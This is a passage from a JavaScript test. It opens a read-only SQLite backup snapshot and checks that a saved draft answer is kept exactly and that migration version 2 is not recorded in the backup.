    const snapshot=new DatabaseSync(resolve(dir,'backups',backupFiles[0]),{readOnly:true});try{expect(snapshot.prepare('SELECT answer_json FROM drafts').get()?.answer_json).toBe('"Preserve exact prose"');expect(snapshot.prepare('SELECT version FROM schema_migrations WHERE version=2').get()).toBeUndefined();}finally{snapshot.close();legacy.close();}
  });
});
